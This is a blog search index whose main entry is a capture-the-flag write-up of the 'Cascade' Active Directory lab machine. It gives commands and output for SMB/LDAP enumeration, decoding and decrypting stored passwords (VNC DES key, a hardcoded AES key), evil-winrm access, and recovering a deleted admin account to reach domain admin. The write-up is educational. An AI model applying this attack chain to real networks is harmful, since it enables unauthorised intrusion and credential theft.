[{"content":"","date":"8 July 2024","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory"},{"content":"","date":"8 July 2024","externalUrl":null,"permalink":"/","section":"Ani blog","summary":"","title":"Ani blog"},{"content":" Scanning : # Run my inital scan to see open ports and services.\n\u0026gt; nmap -sV -sC -Pn -sS -T4 10.10.10.182 # OUTPUT 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-06 15:27:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-08-06T15:28:47 |_ start_date: 2024-08-06T15:26:19 |_clock-skew: 1m00s | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.26 seconds Run full ports scan.\n\u0026gt; nmap -p- --max-retries 1 -n -Pn -T5 10.10.10.182 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49170/tcp open unknown lets add domaine and the FQDN to my /etc/hosts file.\n\u0026gt; echo \u0026#34;10.10.10.182 cascade.local CASC-DC1.cascade.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerate SMB with Null session : # I can connect with null session on smb service.\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\: lets enumerate the user with nxc using users flag.\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\: SMB 10.10.10.182 445 CASC-DC1 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.10.182 445 CASC-DC1 CascGuest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.10.182 445 CASC-DC1 arksvc 2020-01-09 16:18:20 0 SMB 10.10.10.182 445 CASC-DC1 s.smith 2020-01-28 19:58:05 0 SMB 10.10.10.182 445 CASC-DC1 r.thompson 2020-01-09 19:31:26 0 SMB 10.10.10.182 445 CASC-DC1 util 2020-01-13 02:07:11 0 SMB 10.10.10.182 445 CASC-DC1 j.wakefield 2020-01-09 20:34:44 0 SMB 10.10.10.182 445 CASC-DC1 s.hickson 2020-01-13 01:24:27 0 SMB 10.10.10.182 445 CASC-DC1 j.goodhand 2020-01-13 01:40:26 0 SMB 10.10.10.182 445 CASC-DC1 a.turnbull 2020-01-13 01:43:13 0 SMB 10.10.10.182 445 CASC-DC1 e.crowe 2020-01-13 03:45:02 0 SMB 10.10.10.182 445 CASC-DC1 b.hanson 2020-01-13 16:35:39 0 SMB 10.10.10.182 445 CASC-DC1 d.burman 2020-01-13 16:36:12 0 SMB 10.10.10.182 445 CASC-DC1 BackupSvc 2020-01-13 16:37:03 0 SMB 10.10.10.182 445 CASC-DC1 j.allen 2020-01-13 17:23:59 0 SMB 10.10.10.182 445 CASC-DC1 i.croft 2020-01-15 21:46:21 0 # GET ONLY THE USERS \u0026gt; awk \u0026#39;{print $5}\u0026#39; user.txt arksvc s.smith r.thompson util j.wakefield s.hickson j.goodhand a.turnbull e.crowe b.hanson d.burman BackupSvc j.allen i.croft LDAP Null bind : # Using nxc i can see i connect on LDAP using null bind.\n\u0026gt; nxc ldap 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; lets try to enumerate all the user find thanks to ldap query. to do so I made a little bash script that execute the nxc command to use my list.\n#!/bin/bash USER_LIST=\u0026#34;users.lst\u0026#34; while IFS= read -r user; do nxc ldap 10.10.10.182 -u \u0026#34;\u0026#34; -p \u0026#34;\u0026#34; --query \u0026#34;(sAMAccountName=$user)\u0026#34; \u0026#34;\u0026#34; done \u0026lt; \u0026#34;$USER_LIST\u0026#34; # RUN THE SCRIPT \u0026gt; chmod +x script.sh \u0026amp;\u0026amp; ./script.sh in one of the output I find an LDAP attribute unusual enough to use r.thompson\nLDAP 10.10.10.182 389 CASC-DC1 [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 objectClass: top person organizationalPerson user LDAP 10.10.10.182 389 CASC-DC1 cn: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 sn: Thompson LDAP 10.10.10.182 389 CASC-DC1 givenName: Ryan LDAP 10.10.10.182 389 CASC-DC1 distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 instanceType: 4 LDAP 10.10.10.182 389 CASC-DC1 whenCreated: 20200109193126.0Z LDAP 10.10.10.182 389 CASC-DC1 whenChanged: 20200323112031.0Z LDAP 10.10.10.182 389 CASC-DC1 displayName: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 uSNCreated: 24610 LDAP 10.10.10.182 389 CASC-DC1 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 uSNChanged: 295010 LDAP 10.10.10.182 389 CASC-DC1 name: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 objectGUID: 0x2dfa43eaa9e0524ba9132f5b1570418c LDAP 10.10.10.182 389 CASC-DC1 userAccountControl: 66048 LDAP 10.10.10.182 389 CASC-DC1 badPwdCount: 14 LDAP 10.10.10.182 389 CASC-DC1 codePage: 0 LDAP 10.10.10.182 389 CASC-DC1 countryCode: 0 LDAP 10.10.10.182 389 CASC-DC1 badPasswordTime: 133674344266797596 LDAP 10.10.10.182 389 CASC-DC1 lastLogoff: 0 LDAP 10.10.10.182 389 CASC-DC1 lastLogon: 132247339125713230 LDAP 10.10.10.182 389 CASC-DC1 pwdLastSet: 132230718862636251 LDAP 10.10.10.182 389 CASC-DC1 primaryGroupID: 513 LDAP 10.10.10.182 389 CASC-DC1 objectSid: 0x01050000000000051500000032fba1c60b1df147f5c8724555040000 LDAP 10.10.10.182 389 CASC-DC1 accountExpires: 9223372036854775807 LDAP 10.10.10.182 389 CASC-DC1 logonCount: 2 LDAP 10.10.10.182 389 CASC-DC1 sAMAccountName: r.thompson LDAP 10.10.10.182 389 CASC-DC1 sAMAccountType: 805306368 LDAP 10.10.10.182 389 CASC-DC1 userPrincipalName: r.thompson@cascade.local LDAP 10.10.10.182 389 CASC-DC1 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 dSCorePropagationData: 20200126183918.0Z 20200119174753.0Z 20200119174719.0Z 20200119174508.0Z 16010101000000.0Z LDAP 10.10.10.182 389 CASC-DC1 lastLogonTimestamp: 132294360317419816 LDAP 10.10.10.182 389 CASC-DC1 msDS-SupportedEncryptionTypes: 0 LDAP 10.10.10.182 389 CASC-DC1 cascadeLegacyPwd: clk0bjVldmE= this attribute contains a data encoded in b64 we can decode it to find the initial given\n\u0026gt; echo \u0026#34;clk0bjVldmE=\u0026#34; | base64 -d rY4n5eva Thanks to that we have our first access to the domain.\nnxc smb 10.10.10.182 -u \u0026#39;r.thompson\u0026#39; -p rY4n5eva SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\r.thompson:rY4n5eva Back To SMB : # lets enumerate the smb share\n\u0026gt; smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182 -d cascade.local [+] IP: 10.10.10.182:445 Name: cascade.local Status: Authenticated Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Audit$ NO ACCESS C$ NO ACCESS Default share Data READ ONLY IPC$ NO ACCESS Remote IPC NETLOGON READ ONLY Logon server share print$ READ ONLY Printer Drivers SYSVOL READ ONLY Logon server share When we have a lot of sharing to list we can use a module of nxc called spider_plus that will find all the files to which we accessed dand all the shares accessible from the smb service\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;r.thompson\u0026#39; -p rY4n5eva -M spider_plus SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\r.thompson:rY4n5eva SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Started module spidering_plus with the following options: SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] DOWNLOAD_FLAG: False SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] STATS_FLAG: True SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] EXCLUDE_FILTER: [\u0026#39;print$\u0026#39;, \u0026#39;ipc$\u0026#39;] SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] EXCLUDE_EXTS: [\u0026#39;ico\u0026#39;, \u0026#39;lnk\u0026#39;] SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] MAX_FILE_SIZE: 50 KB SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus SMB 10.10.10.182 445 CASC-DC1 [*] Enumerated shares SMB 10.10.10.182 445 CASC-DC1 Share Permissions Remark SMB 10.10.10.182 445 CASC-DC1 ----- ----------- ------ SMB 10.10.10.182 445 CASC-DC1 ADMIN$ Remote Admin SMB 10.10.10.182 445 CASC-DC1 Audit$ SMB 10.10.10.182 445 CASC-DC1 C$ Default share SMB 10.10.10.182 445 CASC-DC1 Data READ SMB 10.10.10.182 445 CASC-DC1 IPC$ Remote IPC SMB 10.10.10.182 445 CASC-DC1 NETLOGON READ Logon server share SMB 10.10.10.182 445 CASC-DC1 print$ READ Printer Drivers SMB 10.10.10.182 445 CASC-DC1 SYSVOL READ Logon server share SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [+] Saved share-file metadata to \u0026#34;/tmp/nxc_hosted/nxc_spider_plus/10.10.10.182.json\u0026#34;. SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Shares: 8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL) SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Readable Shares: 4 (Data, NETLOGON, print$, SYSVOL) SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] SMB Filtered Shares: 1 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Total folders found: 58 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Total files found: 20 SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size average: 1.07 KB SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size min: 6 B SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] File size max: 5.83 KB I connect on network share named Data and collect all the content.\n\u0026gt; smbclient //10.10.10.182/data -U \u0026#39;cascade.local/r.thompson%rY4n5eva\u0026#39; smb: \\\u0026gt; recurse on smb: \\\u0026gt; prompt off smb: \\\u0026gt; mget * NT_STATUS_ACCESS_DENIED listing \\Contractors\\* NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\Production\\* NT_STATUS_ACCESS_DENIED listing \\Temps\\* getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (29.0 KiloBytes/sec) (average 29.0 KiloBytes/sec) getting file \\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (13.8 KiloBytes/sec) (average 21.1 KiloBytes/sec) getting file \\IT\\Logs\\DCs\\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (70.2 KiloBytes/sec) (average 36.8 KiloBytes/sec) getting file \\IT\\Temp\\s.smith\\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (30.1 KiloBytes/sec) (average 35.1 KiloBytes/sec) Among all these files I take note of a user named TempAdmin, this users, which would have been deleted by Arksvc seems to have administrator rights, moreover in the Email Archives note it is said that he has the same password as an Administrator account, interresting…\n\u0026gt; cat /IT/Logs/\u0026#34;Ark AD Recycle Bin\u0026#34;/ArkAdRecycleBin.log 1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 1/10/2018 15:43 [MAIN_THREAD] Validating settings... 1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied 1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5 2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 2/10/2018 15:56 [MAIN_THREAD] Validating settings... 2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 8/12/2018 12:22 [MAIN_THREAD] Validating settings... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 If you pay more attention to the ArkSvc user I can see that it is part of the AD Recycle Bin group. members of this group are allows for the reading of deleted Active Directory objects.\n\u0026gt; nxc ldap 10.10.10.182 -u r.thompson -p rY4n5eva --query \u0026#34;(sAMAccountName=ArkSvc)\u0026#34; \u0026#34;memberOf\u0026#34; LDAP 10.10.10.182 389 CASC-DC1 memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local But before that I still have to search in the files that I recovered in the share, I find a file named VNC Install.reg and in this file it finds a value in hexa in a variable named Password.\n\u0026gt; cat \u0026#34;VNC Install.reg\u0026#34; --- \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f --- I’m looking for how to rip this data and I come across this article on the internet.\nComment déchiffrer les mots de passe VNC\nTo find the data in clear just do the linux command given in the blog.\n\u0026gt; echo -n \u0026lt;HEXA_VALUE\u0026gt; | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 00000000 73 54 33 33 33 76 65 32 |sT333ve2| 00000008 It would seem that we have found s.smith password, we can valid the credential with nxc.\n\u0026gt; nxc ldap 10.10.10.182 -u s.smith -p sT333ve2 -M whoami SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) LDAP 10.10.10.182 389 CASC-DC1 [+] cascade.local\\s.smith:sT333ve2 WHOAMI 10.10.10.182 389 CASC-DC1 distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 Member of: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local WHOAMI 10.10.10.182 389 CASC-DC1 name: Steve Smith WHOAMI 10.10.10.182 389 CASC-DC1 Enabled: Yes WHOAMI 10.10.10.182 389 CASC-DC1 Password Never Expires: Yes WHOAMI 10.10.10.182 389 CASC-DC1 Last logon: 132247275990842339 WHOAMI 10.10.10.182 389 CASC-DC1 pwdLastSet: 132247150854857364 WHOAMI 10.10.10.182 389 CASC-DC1 logonCount: 16 WHOAMI 10.10.10.182 389 CASC-DC1 sAMAccountName: s.smith This user is part of groupe Remote Management Users that meen we can open Powershell session with winrm.\n\u0026gt; evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182 Windows Binary reversing : # with this new user i can connect on the network share named Audit$ lets open the shell with smblcient.\n\u0026gt; smbclient //10.10.10.182/Audit$ -U \u0026#39;cascade.local/s.smith%sT333ve2\u0026#39; Download all the content, In everything we have recover there is a program windows, this program is CascAudit, there are also quite a few librairi file .dll that accompanies it.\nWell I’m not really strong in reverse so I used a tool that will do everything for me this tool is called DnsPy\nthanks to DnSpy I can decompile the .NET program to find pieces of code of the program that are interesting.\nCascAudit.exe :\npublic static void Main() { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } checked { using (SQLiteConnection sqliteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; + MyProject.Application.CommandLineArgs[0] + \u0026#34;;Version=3;\u0026#34;)) { string str = string.Empty; string password = string.Empty; string str2 = string.Empty; try { sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message); return; } } } sqliteConnection.Close(); } catch (Exception ex2) { Console.WriteLine(\u0026#34;Error getting LDAP connection data From database: \u0026#34; + ex2.Message); return; } int num = 0; using (DirectoryEntry directoryEntry = new DirectoryEntry()) { directoryEntry.Username = str2 + \u0026#34;\\\\\u0026#34; + str; directoryEntry.Password = password; directoryEntry.AuthenticationType = AuthenticationTypes.Secure; using (DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry)) { directorySearcher.Tombstone = true; directorySearcher.PageSize = 1000; directorySearcher.Filter = \u0026#34;(\u0026amp;(isDeleted=TRUE)(objectclass=user))\u0026#34;; directorySearcher.PropertiesToLoad.AddRange(new string[] { \u0026#34;cn\u0026#34;, \u0026#34;sAMAccountName\u0026#34;, \u0026#34;distinguishedName\u0026#34; }); using (SearchResultCollection searchResultCollection = directorySearcher.FindAll()) { Console.WriteLine(\u0026#34;Found \u0026#34; + Conversions.ToString(searchResultCollection.Count) + \u0026#34; results from LDAP query\u0026#34;); sqliteConnection.Open(); try { try { foreach (object obj in searchResultCollection) { SearchResult searchResult = (SearchResult)obj; string text = string.Empty; string text2 = string.Empty; string text3 = string.Empty; if (searchResult.Properties.Contains(\u0026#34;cn\u0026#34;)) { text = Conversions.ToString(searchResult.Properties[\u0026#34;cn\u0026#34;][0]); } if (searchResult.Properties.Contains(\u0026#34;sAMAccountName\u0026#34;)) { text2 = Conversions.ToString(searchResult.Properties[\u0026#34;sAMAccountName\u0026#34;][0]); } if (searchResult.Properties.Contains(\u0026#34;distinguishedName\u0026#34;)) { text3 = Conversions.ToString(searchResult.Properties[\u0026#34;distinguishedName\u0026#34;][0]); } using (SQLiteCommand sqliteCommand2 = new SQLiteCommand(\u0026#34;INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)\u0026#34;, sqliteConnection)) { sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Name\u0026#34;, text); sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Username\u0026#34;, text2); sqliteCommand2.Parameters.AddWithValue(\u0026#34;@Dn\u0026#34;, text3); num += sqliteCommand2.ExecuteNonQuery(); } } } finally { IEnumerator enumerator; if (enumerator is IDisposable) { (enumerator as IDisposable).Dispose(); } } } finally { sqliteConnection.Close(); Console.WriteLine(\u0026#34;Successfully inserted \u0026#34; + Conversions.ToString(num) + \u0026#34; row(s) into database\u0026#34;); } } } } } } } CascCrypto.dll Fonction DecryptString:\npublic static string DecryptString(string EncryptedString, string Key) { byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(\u0026#34;1tdyjCbY1Ix49842\u0026#34;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); string @string; using (MemoryStream memoryStream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); @string = Encoding.UTF8.GetString(array2); } } return @string; } Roughly this code is quite interesting because it contains a lot of interesting information including the encryption recipe for the password in a database related to the program. I look in the other file download and I come across a given db file, lets dump the entire content.\n\u0026gt; sqlite3 Audit.db # DUMP ENTIRE DB sqlite\u0026gt; .dump PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE IF NOT EXISTS \u0026#34;Ldap\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;uname\u0026#34; TEXT, \u0026#34;pwd\u0026#34; TEXT, \u0026#34;domain\u0026#34; TEXT ); INSERT INTO Ldap VALUES(1,\u0026#39;ArkSvc\u0026#39;,\u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39;,\u0026#39;cascade.local\u0026#39;); CREATE TABLE IF NOT EXISTS \u0026#34;Misc\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;Ext1\u0026#34; TEXT, \u0026#34;Ext2\u0026#34; TEXT ); CREATE TABLE IF NOT EXISTS \u0026#34;DeletedUserAudit\u0026#34; ( \u0026#34;Id\u0026#34; INTEGER PRIMARY KEY AUTOINCREMENT, \u0026#34;Username\u0026#34; TEXT, \u0026#34;Name\u0026#34; TEXT, \u0026#34;DistinguishedName\u0026#34; TEXT ); INSERT INTO DeletedUserAudit VALUES(6,\u0026#39;test\u0026#39;,replace(\u0026#39;Test\\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); INSERT INTO DeletedUserAudit VALUES(7,\u0026#39;deleted\u0026#39;,replace(\u0026#39;deleted guy\\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); INSERT INTO DeletedUserAudit VALUES(9,\u0026#39;TempAdmin\u0026#39;,replace(\u0026#39;TempAdmin\\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a\u0026#39;,\u0026#39;\\n\u0026#39;,char(10)),\u0026#39;CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local\u0026#39;); DELETE FROM sqlite_sequence; INSERT INTO sqlite_sequence VALUES(\u0026#39;Ldap\u0026#39;,2); INSERT INTO sqlite_sequence VALUES(\u0026#39;DeletedUserAudit\u0026#39;,10); COMMIT; I find the value of the variable pwd that we also find in the code of CascAudit.exe, with all this information I can decrypt the data. I tried to do in python but for a reason I don’t know that I can not do so I went on the site https://www.devglan.com/online-tools/aes-encryption-decryption to do that.\ntry the password we found with the ArkSvc user\n\u0026gt; nxc smb 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\ArkSvc:w3lc0meFr31nd Abuse AD Recyble Bin SecuGroup : # As we know ArkSvc is a member of the group Remote Management Users so I can log in powershell with winrm.\n\u0026gt; evil-winrm -u ArkSvc -p w3lc0meFr31nd -i 10.10.10.182 Now I can abuse the AS Recycle Bin group to dump information about objects deleted from the AD, especially the TempAdmin user.\nGet-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * | # TempAdmin PART accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM The cascadeLegacyPwd attribute that we found in the beginning of the machine is again here on this Users. we can decode the data as before.\n\u0026gt; echo YmFDVDNyMWFOMDBkbGVz | base64 -d baCT3r1aN00dles In logic this password should be the same for the domain administrator.\n\u0026gt; nxc smb 10.10.10.182 -u Administrator -p baCT3r1aN00dles SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\Administrator:baCT3r1aN00dles (Pwn3d!) Lets GOO We Are D.A Now ! 🤩\nRessources : # LDAP Query with nxc : https://www.netexec.wiki/ldap-protocol/query-ldap\nDecrypt VNC Password : https://blog.pascal-mietlicki.fr/comment-dechiffrer-les-mots-de-passe-vnc/\nAbuse AD Recyble Bin Group : https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#deleted-objects\n","date":"8 July 2024","externalUrl":null,"permalink":"/posts/cascade/","section":"Posts","summary":"Scanning : # Run my inital scan to see open ports and services.","title":"OSCP boxe - Cascade"},{"content":"","date":"8 July 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"8 July 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/kerberoasting/","section":"Tags","summary":"","title":"Kerberoasting"},{"content":"","date":"29 April 